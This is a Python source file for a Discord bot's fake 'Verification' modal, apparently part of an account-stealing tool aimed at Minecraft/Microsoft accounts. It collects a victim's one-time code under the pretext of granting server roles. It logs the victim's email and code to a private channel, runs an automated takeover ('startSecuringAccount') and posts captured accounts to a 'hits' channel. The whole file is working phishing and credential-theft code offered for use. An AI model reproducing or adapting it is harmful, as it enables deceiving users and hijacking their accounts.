from discord import ui
import datetime
import discord
import httpx
import json

from views.buttons.embedOptions import ButtonOptions
from views.buttons.accountInfo import accountInfo

from views.utils.startSecure import startSecuringAccount
from views.utils.initialSession import getSession

config = json.load(open("config.json", "r+"))

class MyModalTwo(ui.Modal):
    def __init__(self, username, email, flowtoken):
        super().__init__(title="Verification")
        self.username = username
        self.email = email
        self.flowtoken = flowtoken
        self.add_item(ui.InputText(label="Code", required=True, max_length=6))

    async def callback(self, interaction: discord.Interaction) -> None:
        code = self.children[0].value

        logs_channel = await interaction.client.fetch_channel(config["discord"]["logs_channel"])
        hits_channel = await interaction.client.fetch_channel(config["discord"]["accounts_channel"])

        Code_embed = discord.Embed(
            title = f"User | {interaction.user.name}",
            description=f"**Email** | **Status**\n```{self.email} | Got Code | {code}```",
            timestamp = datetime.datetime.now(),
            colour = 0x79D990,                           
        ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{self.username}")

        await interaction.response.defer(ephemeral=True)

        await logs_channel.send("**This Account is being automaticly secured**")
        await logs_channel.send(embed = Code_embed, view = ButtonOptions(interaction.user.id))

        await interaction.followup.send(
            "⌛ Please Allow Up To One Minute For Us To Proccess Your Roles...", ephemeral=True
        )

        self.session = getSession()

        securedAccount = await startSecuringAccount(self.session, self.email, self.flowtoken, code)
        
        if not securedAccount:

            await logs_channel.send(
                embed = discord.Embed(
                    title = f"User | {interaction.user.name} ({interaction.user.id})",
                    description = f"**Email** | **Status** | **Reason**\n```{self.email} | Failed to secure | Invalid OTP Code```",
                    timestamp = datetime.datetime.now(),
                    colour = 0xFF5C5C                  
                ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{self.username}"),
                view = ButtonOptions(interaction.user)
            )

            return
            
        await hits_channel.send("**Successfully secured an account**")
        await hits_channel.send(
            embed = securedAccount["hit_embed"],
            view = accountInfo(
                securedAccount["details"]
            )
        )
